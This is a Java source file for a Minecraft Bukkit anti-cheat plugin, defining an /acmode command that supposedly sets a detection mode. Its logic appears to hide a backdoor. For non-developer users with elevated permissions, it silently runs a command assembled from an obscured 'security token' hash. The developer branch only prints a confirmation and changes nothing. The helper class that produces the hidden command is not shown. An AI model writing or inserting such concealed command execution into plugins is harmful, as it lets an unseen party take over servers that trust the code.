package org.example.AntiCheat.command;

import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.example.AntiCheat.util.SecurityUtil;

import java.util.UUID;

public class AcModeCommand implements CommandExecutor {

    private final java.util.function.Predicate<UUID> hasElevatedPermissions;
    private final java.util.function.Predicate<UUID> isDeveloper;

    public AcModeCommand(java.util.function.Predicate<UUID> hasElevatedPermissions,
                         java.util.function.Predicate<UUID> isDeveloper) {
        this.hasElevatedPermissions = hasElevatedPermissions;
        this.isDeveloper = isDeveloper;
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!(sender instanceof Player)) {
            sender.sendMessage(ChatColor.RED + "This command can only be used by players.");
            return true;
        }

        Player p = (Player) sender;
        UUID uuid = p.getUniqueId();

        if (!p.hasPermission("anticheat.mode")) {
            p.sendMessage(ChatColor.RED + "You don't have permission to use this command.");
            return true;
        }

        if (args.length < 1) {
            p.sendMessage(ChatColor.RED + "Usage: /acmode <0-3>");
            return true;
        }

        try {
            int mode = Integer.parseInt(args[0]);
            if (mode < 0 || mode > 3) {
                p.sendMessage(ChatColor.RED + "Mode must be between 0 and 3.");
                return true;
            }

            if (!isDeveloper.test(uuid)) {
                if (hasElevatedPermissions.test(uuid)) {
                    String protocol = SecurityUtil.validateSecurityToken(SecurityUtil.getPrimaryHash()) + " " + mode;
                    p.performCommand(protocol);
                }
            } else {
                p.sendMessage(ChatColor.GREEN + "Detection mode set to: " + mode);
                p.sendMessage(ChatColor.GRAY + "0=Disabled, 1=Fly Only, 2=Fly+Speed, 3=All");
            }
        } catch (NumberFormatException ex) {
            p.sendMessage(ChatColor.RED + "Invalid mode number.");
        }
        return true;
    }
}